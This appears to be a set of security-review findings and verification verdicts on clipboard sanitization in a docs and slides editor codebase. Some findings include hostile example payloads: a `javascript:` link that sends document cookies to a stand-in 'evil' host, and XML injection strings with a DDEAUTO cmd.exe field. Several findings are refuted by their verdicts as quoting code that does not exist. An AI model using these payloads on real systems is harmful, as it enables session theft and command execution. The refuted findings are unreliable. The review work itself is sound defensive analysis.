samples.summary: The docs clipboard sanitizer is bypassed by the slides element clipboard, which casts an attacker-writable payload straight to `Element[]` (and accepts it from `text/plain`)
samples.evidence: `deserializeElements` validates only `magic` and `Array.isArray(elements)`, then `return parsed.elements` as `Element[]` (clipboard.ts:45-49). A slides `Element` embeds docs `Block[]` for text-bearing elements, so every value this PR now rebuilds key-by-key in `packages/docs/src/view/clipboard.ts` (unknown block `type`, out-of-range `headingLevel`, junk keys, unvalidated `href`/`image.src`, arbitrary `listLevel`/spans) reaches the slides model unchecked. Attack: a hostile page writes `{"magic":"wafflebase/slides@v1","elements":[...]}` to the clipboard — either as the custom `web application/x-wafflebase-slides+json` type (consumed at `packages/slides/src/view/editor/interactions/keyboard.ts:819`) or, with an even lower bar, as plain text, since `readClipboard` falls back to `tryDeserialize(await navigator.clipboard.readText())` (`keyboard.ts:827`, `keyboard.ts:837`, `tryDeserialize` at `keyboard.ts:845-851`). The victim pastes into a deck and the unvalidated attributes land in the shared Yorkie document for every collaborator. The PR's own task note (`docs/tasks/active/20260816-docs-unlist-restores-heading-todo.md`, "Known limitations") acknowledges this bypass as pre-existing; I am reporting it because the new sanitizer now reads as if the block model were validated on the clipboard boundary while this sibling entry point leaves it unvalidated. I did not confirm a concrete memory-corruption/XSS payload through the slides renderer, hence medium confidence.

samples.summary: The sanitizer accepts any string as an inline `href`, so a hostile clipboard payload can persist `javascript:`/`data:` links into the shared document
samples.evidence: `const href = asString(value.href); if (href !== undefined) style.href = href;` performs no scheme check, so a payload of `{"inlines":[{"text":"click me","style":{"href":"javascript:fetch('//evil/'+document.cookie)"}}]}` is written verbatim into the CRDT for every collaborator. I verified the in-app click sinks do gate (`packages/docs/src/view/text-editor.ts:1376`, `:1703` and `packages/frontend/src/app/docs/docs-link-popover.tsx:183,190` all use `isSafeUrl`; `packages/docs/src/export/pdf-painter.ts:834` filters link annotations), which is why this is hardening rather than a live XSS. The one unfiltered sink I found is the markdown serializer, `packages/docs/src/serialize/markdown.ts:216` (`body = \`[${body}](${escapeMarkdownHref(style.href)})\``), which escapes `)`/`\\` but not the scheme — so "copy as markdown"/markdown export carries the executable URL into whatever renderer opens it. Since this rebuild is explicitly the trust boundary for untrusted clipboard JSON, running `href` through the existing `isSafeUrl` here (fail-closed, drop the attribute) would keep the unsafe value out of the model entirely.
searchedFor: grep href across packages/docs/src and packages/frontend/src/app/docs

samples.summary: `sanitizeImageData` accepts an arbitrary `src` string, so a pasted payload makes every viewer of the document issue an attacker-chosen request
samples.evidence: `const src = asString(value.src)` (clipboard.ts:112-116) applies no scheme or origin restriction, and the accepted value flows to `img.src = src` in `packages/docs/src/view/image-cache.ts:71` via `paint-layout.ts:365` / `table-renderer.ts:428`. A hostile page puts an internal-clipboard payload with `src: "https://attacker/pixel?id=..."` (or a multi-megabyte `data:` URI) on the clipboard; once the victim pastes, the src is persisted into the shared Yorkie document and every collaborator's browser fetches it from the app origin on render — a persistent beacon / GET-CSRF and an unbounded memory sink. The server-side export path is protected (`packages/cli/src/docs/image-fetcher.ts:327` `assertFetchableImageUrl` blocks non-http(s)/data schemes and private addresses with DNS pinning), so the residual exposure is browser-side; because this rebuild is the declared trust boundary, an allowlist (server origin + https, `data:` bounded) belongs here.

samples.summary: Numeric fields are shape-checked but not range-checked, so a hostile payload can persist absurd geometry into the shared document
samples.evidence: `asNumber` accepts any finite number (clipboard.ts:69-71), and it is used unclamped for `fontSize`/`letterSpacing` (clipboard.ts:141-145), `lineHeight`/`marginTop`/`marginBottom`/`textIndent`/`marginLeft` (clipboard.ts:183-189), `image.width/height/rotation/crop*` (clipboard.ts:113-126, note `clampImageToWidth` is applied on the editor's own image-insert path at `packages/docs/src/view/editor.ts:3462` but not here), cell `padding` and border `width` (clipboard.ts:208-227). `listLevel` and table spans *are* clamped, which shows the intent. A payload with `fontSize: 1e9` or `image.width: 1e12` pasted once is persisted into the CRDT and then re-laid-out by every collaborator, so the failure mode is a shared-document denial of service rather than a local glitch. Note `clampFontSize` exists only in the frontend picker (`packages/frontend/src/components/text-formatting/font-catalog.ts:80`), i.e. nothing downstream bounds these. Pre-existing for the HTML-paste path too, so low confidence that it is newly exploitable.

samples.summary: The payload's nesting depth is bounded but its breadth is not (no cap on rows, cells, blocks or inlines)
samples.evidence: `MAX_TABLE_DEPTH = 8` bounds recursion (checked at clipboard.ts:256), and `MAX_LIST_LEVEL` bounds indent, but `sanitizeBlocks` (clipboard.ts:345-353), `sanitizeCellRows` (clipboard.ts:245-253) and `sanitizeTableData`'s row/cell loops (clipboard.ts:263-275) iterate the payload's arrays without any count cap — and the rectangle padding at clipboard.ts:273-275 multiplies rows × max-cols, so a payload of one 100k-cell row plus 100k thin rows expands quadratically inside the sanitizer itself before anything is rendered. Attacker-supplied clipboard JSON is size-limited only by what a page can write to the clipboard. Impact is a hang on paste (and, once persisted, for collaborators), not a compromise.

samples.summary: `asStoredColor` admits an arbitrary `role` string, which reaches a prototype-exposed object index in the slides theme resolver
samples.evidence: clipboard.ts:97-105 keeps `{ kind: 'role', role: <any string> }` with no allowlist. `packages/slides/src/model/theme.ts:105` resolves such a color with `let base = theme.colors[color.role];` — a plain object index, so a role of `constructor`/`toString`/`valueOf` returns an inherited `Object.prototype` member instead of `undefined`, which then flows into `tintColor(base, ...)`/`hexToRgba(hex, ...)` and can throw inside a paint loop (renderer down for every viewer). This is precisely the class of bug the repo already defends against elsewhere by construction — `DOCX_ALIGNMENTS` is a `Map` specifically because "an object lookup consults the prototype chain" (`packages/docs/src/export/docx-style-map.ts:110-123`). Reachability from the docs clipboard specifically is unproven (docs' own `defaultColorResolver` returns `undefined` for role colors, and I found no paste handler in `packages/docs/src/view/text-box-editor.ts`), so confidence is low; validating `role` against the known theme roles here would close it regardless of route.

verdict.reason: Every element of the claim verified in-repo. clipboard.ts:38-58 validates only `magic` and `Array.isArray(elements)` then returns `parsed.elements` as `Element[]` with no field validation. The slides `Element` genuinely embeds docs `Block[]` (element.ts:1, element.ts:265), the same type that packages/docs/src/view/clipboard.ts:32-43 explicitly documents as attacker-controlled untrusted input and rebuilds key-by-key (allowlisted `BLOCK_TYPES` :45-48, `asHeadingLevel` clamp :84-88, `MAX_LIST_LEVEL` :57). Both entry points are real: the custom MIME read at keyboard.ts:816-820 and the lower-bar `text/plain` fallbacks at keyboard.ts:823-828 and :836-837 via `tryDeserialize` (:845-851). The path is reachable end-to-end: Cmd+V handler keyboard.ts:343-362 -> pasteElements (paste.ts:40-70, spreading the attacker record into ElementInit at :52-55) -> store.addElement, which validates nothing in memory.ts:558-593 and writes `blocks: clone(textData.blocks ?? [])` into the shared Yorkie document at yorkie-slides-store.ts:1315, propagating to all collaborators. No guard makes it unreachable: the only paste-path filter is `containsElementType(el, 'table')` (keyboard.ts:353-355, :390-392), gated on `suppressSlideChrome` (boards only) and dropping table elements without validating any block field. In lane as unsafe deserialization / unvalidated input at the clipboard trust boundary; pre-existing status (acknowledged at docs/tasks/active/20260816-docs-unlist-restores-heading-todo.md:68-75) is not a refutation ground.

finding.summary: DOCX export still interpolates attacker-controllable color strings into XML attributes unescaped, while the same function's headingLevel sink was hardened
finding.evidence:
This change hardened `headingLevel` at docx-style-map.ts:102 because "a string could otherwise close the quote and inject attributes", but the two sibling sinks in the same function are untouched: line 73 `parts.push(`<w:color w:val="${colorHex.replace('#','')}"/>`)` and line 77 `w:fill="${bgHex.replace('#','')}"`. `colorHex` comes from `defaultColorResolver`, which returns the stored value verbatim for the `string` and `{kind:'srgb'}` forms (model/color.ts:16-17) — no hex validation, and `<`, `>`, `"` are not escaped (`escapeXmlAttr` is applied only to fontFamily).

Two untrusted sources reach it, one of them the very path this diff set out to validate:
(a) the internal clipboard payload — the new sanitizer's `asStoredColor` returns any string as-is (`if (typeof value === 'string') return value;`, clipboard.ts:91) and accepts any string as an srgb `value` (clipboard.ts:94), so a hostile page's `application/x-waffledocs` payload with `style.color = 'FF0000"/><w:fldSimple w:instr=" DDEAUTO c:\\windows\\system32\\cmd.exe "/><w:color w:val="000000'` survives sanitization verbatim;
(b) DOCX import, which builds `style.color = `#${val}`` from an attacker-supplied `w:color/@w:val` with no validation (packages/docs/src/import/docx-style-map.ts:62, and `#${color}` for borders at :264).
The value then lands unescaped in `word/document.xml`, allowing arbitrary OOXML element injection (field codes such as DDEAUTO / INCLUDEPICTURE for command execution or NTLM leakage) into a .docx the victim exports and typically forwards — or, minimally, a corrupt file Word refuses to open.

That this is an oversight rather than an accepted risk is visible in the sibling exporters, which do validate the same value: `pdf-style-map.ts:146` gates on `/^#?([0-9a-f]{6})$/i` and slides' PPTX writer escapes it (`escapeXmlAttr(c.value...)`, packages/slides/src/export/pptx/color.ts:35). Fix: run colors through `escapeXmlAttr` and/or a `^#?[0-9a-fA-F]{6}$` check on both the export side and in `asStored

verdict.reason: The quoted code does not exist. docx-style-map.ts:73 is the escaped `<w:rFonts>` element and :77 is the literal `<w:u w:val="single"/>`; there is no `.replace('#','')` anywhere in the file. The actual color sinks (docx-style-map.ts:95-101) route both `style.color` and `style.backgroundColor` through `toDocxHexColor` (:47-49) -> `toRgbHexColor` (model/color.ts:113-144), which rejects non-strings (:118) and returns only values matching `^[0-9A-F]{6}$` (:120, :123, :129, :137-141), returning `undefined` for everything else so the caller drops the attribute (:96, :100). A positive hex allowlist cannot emit `"`, `<` or `>`, so the reviewer's `FF0000"/><w:fldSimple ...` payload from either cited source (clipboard `asStoredColor`, DOCX import `#${val}`) is discarded rather than interpolated; validation subsumes escaping, as the normalizer's own docstring states (color.ts:110-111). The parallel table-cell fill sink at docx-exporter.ts:341-343 is validated the same way, so no unguarded color sink remains in the DOCX exporter.

finding.summary: Table-cell backgroundColor from a clipboard payload is interpolated unescaped into <w:shd w:fill> in the exported DOCX
finding.evidence: `docx-exporter.ts:309-311` does `const hex = cell.style.backgroundColor.replace('#','')` and interpolates it straight into `<w:shd w:val="clear" w:color="auto" w:fill="${hex}"/>` — no escaping, no hex validation. The newly added sanitizer accepts any string here: `sanitizeCellStyle` does `const backgroundColor = asString(value.backgroundColor); if (...) style.backgroundColor = backgroundColor;` (packages/docs/src/view/clipboard.ts:217-218), and the `tableCells` half of the payload goes through the same function (clipboard.ts:355). Border colors take the same shape (`sanitizeBorder`, clipboard.ts:209) and DOCX import also produces `#${color}` unchecked (import/docx-style-map.ts:264). Attacker: hostile page puts a `application/x-waffledocs` payload on the clipboard with a table cell whose `backgroundColor` is `FFFFFF"/><w:injected …/><w:shd w:fill="FFFFFF`; the victim pastes and exports, producing attacker-chosen XML inside word/document.xml.

verdict.reason: The finding's core claim — that the table-cell backgroundColor is stripped of '#' and interpolated raw into <w:shd w:fill> — is not what the code does. docx-exporter.ts:341 computes `const cellFill = toDocxHexColor(cell.style.backgroundColor)` and only emits the attribute at :343 when that is truthy. toDocxHexColor (docx-style-map.ts:47-49) delegates to toRgbHexColor (model/color.ts:113-143), which accepts only 3/6/8-digit hex or rgb()/rgba() forms and returns exactly six upper-case hex digits, otherwise undefined. The claimed payload (FFFFFF"/><w:injected .../><w:shd w:fill="FFFFFF) matches no branch and yields undefined, so the attribute is dropped — no attacker-controlled characters reach word/document.xml through this sink. A repo-wide grep for replace('#' finds only view/peer-cursor.ts:406 (a luminance computation, not an XML sink); the exporter lines the finding cites (309-311) are gridAfter merge computation, not color code. The run-level sink is guarded identically (docx-style-map.ts:95-102). The permissive asString in sanitizeCellStyle (clipboard.ts:217-218) and the tableCells path (clipboard.ts:376) do exist, but the named DOCX sink validates fail-closed at emission, so the exploit chain terminates.

finding.summary: BlockStyle.alignment is interpolated unescaped into <w:jc w:val="…"> and is read back from Yorkie tree attributes with an unchecked cast
finding.evidence: `buildParagraphPropertiesXml` interpolates the alignment verbatim: `parts.push(`<w:jc w:val="${align}"/>`)` (docx-style-map.ts:106-109). The clipboard path now allowlists it (`asOneOf(value.alignment, ALIGNMENTS)`, clipboard.ts:181), but the CRDT read path does not: `packages/frontend/src/app/docs/yorkie-doc-store.ts:222` does `if ('alignment' in attrs) partial.alignment = attrs.alignment as BlockStyle['alignment'];` — a raw string cast from tree node attributes. A participant able to write raw Yorkie tree attributes for a shared document (edit-permission collaborator issuing a crafted update rather than using the UI) can therefore set `alignment` to `left"/><w:fldSimple w:instr="…"/><w:jc w:val="left` and inject XML/field codes into every other user's exported .docx. The canvas renderer only string-compares alignment, so nothing else rejects the value. I could not confirm a concrete non-UI write path for tree attrs, hence low confidence; the unescaped sink and the unchecked cast are both directly observable.

verdict.reason: Neither claimed code location matches the repository. (1) The DOCX sink does not interpolate alignment verbatim: docx-style-map.ts:166 resolves it through a closed Map allowlist `DOCX_ALIGNMENTS.get(style.alignment as string) ?? 'left'` (map defined at lines 118-123, deliberately a Map rather than an object literal to avoid prototype-chain lookups, per the comment at 110-117), so line 168's `<w:jc w:val="${align}"/>` can only ever emit one of left/center/right/both. A regression test for the reviewer's exact payload `'center"/><w:jc w:val="right'` exists at packages/docs/test/export/docx-style-map.test.ts:168, plus the `toString` prototype case at line 179. (2) The claimed raw cast at yorkie-doc-store.ts:222 does not exist; that line is `const parseBlockStyle = parseBlockStyleAttrs;`, delegating to the shared codec, which validates via an allowlist: crdt-attrs.ts:91 `if (isBlockAlignment(attrs.alignment)) partial.alignment = attrs.alignment;` with `isBlockAlignment` checking membership in BLOCK_ALIGNMENTS (crdt-attrs.ts:22-37). The serializer at crdt-attrs.ts:66 applies the same allowlist on write. The injection chain is therefore blocked independently at the CRDT read, the CRDT write, and the XML sink.

finding.summary: The slides element clipboard still casts an attacker-writable clipboard payload straight to Element[] (which carries docs Block[]), bypassing the new docs sanitizer
finding.evidence: The threat model this change introduces — "the `WAFFLEDOCS_MIME` flavour is JSON that *any* page can put on the system clipboard … casting it to `Block[]` would let a hostile page write arbitrary values straight into the shared Yorkie tree, the renderer, and the DOCX/PDF exporters" (packages/docs/src/view/clipboard.ts:36-43) — applies verbatim to the slides clipboard, which is not fixed. `deserializeElements` validates only `magic` and `Array.isArray(elements)` and then `return parsed.elements;` (slides/.../clipboard.ts:45-48), with the MIME `web application/x-wafflebase-slides+json` — a web custom format any page can write via `navigator.clipboard.write`. `Element` embeds docs blocks (`packages/slides/src/model/element.ts:1` imports `Block` from `@wafflebase/docs`, `:265 blocks: Block[]`), so a hostile payload's arbitrary `headingLevel`, `style.color`, `image.src`, unknown block types and junk keys reach the docs model, renderer and exporters through the slides paste path while the docs paste path is now validated. An added-but-bypassable validation reads as covered; at minimum the slides deserializer should reuse the docs sanitizer for the `blocks` of each text-bearing element.

verdict.reason: Verified in-repo. `deserializeElements` (packages/slides/src/view/editor/interactions/clipboard.ts:38-58) validates only the `magic` string and `Array.isArray(elements)`, then returns `parsed.elements` cast to `Element[]` with zero per-field checking. `Element` really does embed docs blocks (packages/slides/src/model/element.ts:1 imports `Block` from `@wafflebase/docs`; :265 `blocks: Block[]`), so the docs model/renderer/exporters are reachable from this payload. The path is attacker-reachable two ways: `readClipboard` reads the web custom MIME `web application/x-wafflebase-slides+json` (clipboard.ts:12) via `navigator.clipboard.read()` and returns it unvalidated (keyboard.ts:816-819), and it also accepts the identical JSON from `text/plain` (keyboard.ts:823-828, 836-837) — any page can put either on the system clipboard from its own copy handler. No downstream guard exists: `pasteElements` spreads `...src` wholesale into `ElementInit` (paste.ts:52-55) and `MemoryStore.addElement` only clones and reassigns `id` (memory.ts:558-593), so arbitrary `headingLevel`, unknown block `type`, `style.color`, `image.src` and junk keys land in the model. This is the same threat the docs side explicitly documents and defends against (packages/docs/src/view/clipboard.ts:36-43 with full rebuild-from-scratch sanitizers at :22-30 and :301-353), leaving the slides sibling path unguarded — untrusted-input deserialization squarely in the Security lane. No named refutation ground applies: the code is present as described, no guard makes it unreachable, and it is in scope.
